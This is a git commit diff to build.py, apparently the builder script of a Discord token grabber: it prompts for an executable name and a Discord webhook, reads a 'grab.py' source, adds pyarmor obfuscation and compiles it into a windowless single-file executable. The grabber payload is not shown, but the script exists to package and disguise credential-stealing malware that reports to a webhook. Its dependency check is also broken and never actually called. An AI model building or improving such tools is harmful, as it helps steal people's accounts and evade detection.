98a7d8ad596d737261de4c4b4e488521d40a08d4
Echo <66488397+NullByte75@users.noreply.github.com>
2021-04-20 16:58:02 +0200

    Update build.py

--- build.py
+++ build.py
@@ -8,11 +8,25 @@ def compile(code, name):
     f = open("main.py", "w")
     f.write(code)
     f.close()
+    print("Protecting code using pyarmor...")
+    subprocess.run("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyarmor.exe obfuscate main.py", shell=True)
     print("Compiling code...")
-    subprocess.run("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyinstaller.exe main.py --onefile --noconsole --name " + name, shell=True)
+    subprocess.run("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyinstaller.exe dist\\main.py --onefile --noconsole --name " + name, shell=True)
     print("Compile complete!")
+    os.remove("dist\\main.py")
+    os.remove("dist\\build.py")
+
+def check_for_depencies():
+    if not os.path.isfile("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyarmor.exe") or os.path.isfile("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyinstaller.exe") :
+        return False
+    else:
+        return True
 
 def main():
+    if check_for_depencies:
+        print("Dependencies ok, firing up")
+    else:
+        print("Coudn't find dependencies, exiting")
     name = input(str("Enter name for executable: "))
     webhook = input(str("Enter Discord webhook: "))
     with open("src\\grab.py", "r") as file:
